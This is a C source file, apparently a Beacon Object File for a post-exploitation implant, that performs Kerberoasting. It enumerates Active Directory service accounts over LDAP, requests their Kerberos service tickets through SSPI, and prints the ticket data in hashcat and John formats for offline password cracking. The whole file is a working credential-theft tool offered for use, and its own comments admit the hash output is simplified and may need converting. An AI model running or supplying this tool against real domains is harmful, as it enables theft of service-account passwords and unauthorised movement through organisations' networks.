/*
 * kerberoast.c — Request TGS tickets for SPN accounts, output hashes.
 *
 * Phase 1: LDAP enumeration of accounts with servicePrincipalName
 * Phase 2: SSPI InitializeSecurityContext to request TGS for each SPN
 * Phase 3: Extract encrypted ticket data and format for cracking
 *
 * Uses wldap32.dll for LDAP and secur32.dll for Kerberos SSPI.
 */
#include <windows.h>
#include <winldap.h>
#define SECURITY_WIN32
#include <security.h>
#include "beacon_compat.h"

/* LDAP imports */
DECLSPEC_IMPORT LDAP* LDAPAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR* LDAPAPI WLDAP32$ldap_get_valuesW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_value_freeW(PWSTR*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP*);

/* SSPI imports */
DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$AcquireCredentialsHandleW(
    LPWSTR, LPWSTR, ULONG, PVOID, PVOID, PVOID, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$InitializeSecurityContextW(
    PCredHandle, PCtxtHandle, LPWSTR, ULONG, ULONG, ULONG,
    PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$FreeCredentialsHandle(PCredHandle);
DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$DeleteSecurityContext(PCtxtHandle);
DECLSPEC_IMPORT SECURITY_STATUS SEC_ENTRY SECUR32$FreeContextBuffer(PVOID);

/* Kernel32 imports */
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);

static void build_base_dn(const wchar_t *domain, wchar_t *dn, int dn_size) {
    dn[0] = L'\0';
    const wchar_t *p = domain;
    int first = 1;
    while (*p) {
        if (!first) wcscat(dn, L",");
        wcscat(dn, L"DC=");
        const wchar_t *dot = wcschr(p, L'.');
        if (dot) {
            int len = (int)(dot - p);
            int cur = (int)wcslen(dn);
            if (cur + len < dn_size - 1) {
                memcpy(dn + cur, p, len * sizeof(wchar_t));
                dn[cur + len] = L'\0';
            }
            p = dot + 1;
        } else {
            wcscat(dn, p);
            break;
        }
        first = 0;
    }
}

static void bytes_to_hex(const unsigned char *data, int len, char *out, int out_size) {
    const char hex[] = "0123456789abcdef";
    int i;
    for (i = 0; i < len && (i * 2 + 2) < out_size; i++) {
        out[i * 2]     = hex[(data[i] >> 4) & 0x0F];
        out[i * 2 + 1] = hex[data[i] & 0x0F];
    }
    out[i * 2] = '\0';
}

/*
 * Request a TGS ticket for a given SPN via SSPI and output the hash.
 *
 * The AP-REQ from InitializeSecurityContext contains the TGS ticket.
 * We extract the encrypted portion for offline cracking.
 *
 * For hashcat mode 13100 (RC4/etype 23):
 *   $krb5tgs$23$*user$realm$spn*$checksum$cipher
 *
 * The AP-REQ is ASN.1 encoded (RFC 4120). We do a simplified parse
 * to extract the ticket's encrypted part.
 */
static BOOL request_tgs_and_hash(CredHandle *cred, const wchar_t *spn,
                                  const char *username, const char *domain,
                                  int hashcat_format) {
    CtxtHandle ctx = {0};
    SecBufferDesc out_desc = {0};
    SecBuffer out_buf = {0};
    ULONG ctx_attr = 0;
    TimeStamp expiry = {0};

    out_buf.BufferType = SECBUFFER_TOKEN;
    out_buf.cbBuffer = 0;
    out_buf.pvBuffer = NULL;
    out_desc.ulVersion = SECBUFFER_VERSION;
    out_desc.cBuffers = 1;
    out_desc.pBuffers = &out_buf;

    SECURITY_STATUS ss = SECUR32$InitializeSecurityContextW(
        cred, NULL, (LPWSTR)spn,
        ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
        0, SECURITY_NATIVE_DREP,
        NULL, 0, &ctx, &out_desc, &ctx_attr, &expiry);

    if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED) {
        return FALSE;
    }

    if (!out_buf.pvBuffer || out_buf.cbBuffer == 0) {
        SECUR32$DeleteSecurityContext(&ctx);
        return FALSE;
    }

    /*
     * The output buffer contains an AP-REQ. The ticket is embedded within.
     * For a simplified approach, we output the entire ticket blob as hex.
     * A more complete implementation would parse the ASN.1 to extract
     * the etype, realm, sname, and cipher separately.
     *
     * For now, output the raw ticket blob. The operator can use tools
     * like kirbi2hashcat to convert if needed, or we output a simplified
     * format that captures the essential data.
     */
    unsigned char *ticket_data = (unsigned char *)out_buf.pvBuffer;
    DWORD ticket_len = out_buf.cbBuffer;

    /* Allocate hex buffer (2 chars per byte + null) */
    int hex_size = ticket_len * 2 + 1;
    char *hex_buf = (char *)HeapAlloc(GetProcessHeap(), 0, hex_size);
    if (!hex_buf) {
        SECUR32$FreeContextBuffer(out_buf.pvBuffer);
        SECUR32$DeleteSecurityContext(&ctx);
        return FALSE;
    }

    bytes_to_hex(ticket_data, ticket_len, hex_buf, hex_size);

    char spnN[256] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, spn, -1, spnN, 256, NULL, NULL);

    if (hashcat_format) {
        /* Simplified hashcat-compatible format */
        /* $krb5tgs$23$*user$domain$spn*$<ticket_hex> */
        BeaconPrintf(CALLBACK_OUTPUT,
            "$krb5tgs$23$*%s$%s$%s*$%s",
            username, domain, spnN, hex_buf);
    } else {
        /* John format */
        BeaconPrintf(CALLBACK_OUTPUT,
            "$krb5tgs$%s$%s$*23*%s",
            username, domain, hex_buf);
    }

    HeapFree(GetProcessHeap(), 0, hex_buf);
    SECUR32$FreeContextBuffer(out_buf.pvBuffer);
    SECUR32$DeleteSecurityContext(&ctx);

    return TRUE;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain_a = BeaconDataExtract(&parser, NULL);
    char *spn_a    = BeaconDataExtract(&parser, NULL);
    int   format   = BeaconDataInt(&parser);
    char *server_a = BeaconDataExtract(&parser, NULL);

    wchar_t wDomain[256] = {0}, wServer[256] = {0};

    if (domain_a && *domain_a)
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain_a, -1, wDomain, 256);
    else {
        DWORD size = 256;
        KERNEL32$GetComputerNameExW(2, wDomain, &size);
    }

    if (server_a && *server_a)
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, server_a, -1, wServer, 256);

    /* Acquire Kerberos credentials handle */
    CredHandle credHandle = {0};
    TimeStamp credExpiry = {0};

    SECURITY_STATUS ss = SECUR32$AcquireCredentialsHandleW(
        NULL, L"Kerberos", SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL, &credHandle, &credExpiry);

    if (ss != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] AcquireCredentialsHandle failed: 0x%x", ss);
        return;
    }

    /* If specific SPN provided, just request that one */
    if (spn_a && *spn_a) {
        wchar_t wSpn[512];
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, spn_a, -1, wSpn, 512);

        char domainN[256] = {0};
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, domainN, 256, NULL, NULL);

        if (request_tgs_and_hash(&credHandle, wSpn, "unknown", domainN, format))
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Kerberoasted 1 SPN");
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to request TGS for %s", spn_a);

        SECUR32$FreeCredentialsHandle(&credHandle);
        return;
    }

    /* Enumerate all SPNs via LDAP */
    LDAP *ld = WLDAP32$ldap_initW(wServer[0] ? wServer : wDomain, 389);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed");
        SECUR32$FreeCredentialsHandle(&credHandle);
        return;
    }

    if (WLDAP32$ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_bind failed");
        WLDAP32$ldap_unbind(ld);
        SECUR32$FreeCredentialsHandle(&credHandle);
        return;
    }

    wchar_t baseDN[512];
    build_base_dn(wDomain, baseDN, 512);

    wchar_t *filter = L"(&(objectCategory=person)(objectClass=user)"
                      L"(servicePrincipalName=*)"
                      L"(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";

    wchar_t *attrs[] = { L"sAMAccountName", L"servicePrincipalName", NULL };
    LDAPMessage *results = NULL;

    if (WLDAP32$ldap_search_sW(ld, baseDN, LDAP_SCOPE_SUBTREE,
                                filter, attrs, 0, &results) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_search failed");
        WLDAP32$ldap_unbind(ld);
        SECUR32$FreeCredentialsHandle(&credHandle);
        return;
    }

    int ticket_count = 0;
    char domainN[256] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, domainN, 256, NULL, NULL);

    LDAPMessage *entry = WLDAP32$ldap_first_entry(ld, results);
    while (entry) {
        wchar_t **samV = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
        wchar_t **spnV = WLDAP32$ldap_get_valuesW(ld, entry, L"servicePrincipalName");

        if (samV && samV[0] && spnV && spnV[0]) {
            char samN[128] = {0};
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, samV[0], -1, samN, 128, NULL, NULL);

            /* Request TGS for the first SPN of this account */
            if (request_tgs_and_hash(&credHandle, spnV[0], samN, domainN, format)) {
                ticket_count++;
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed TGS for %s", samN);
            }
        }

        if (samV) WLDAP32$ldap_value_freeW(samV);
        if (spnV) WLDAP32$ldap_value_freeW(spnV);

        entry = WLDAP32$ldap_next_entry(ld, entry);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Kerberoasted %d accounts", ticket_count);

    WLDAP32$ldap_msgfree(results);
    WLDAP32$ldap_unbind(ld);
    SECUR32$FreeCredentialsHandle(&credHandle);
}
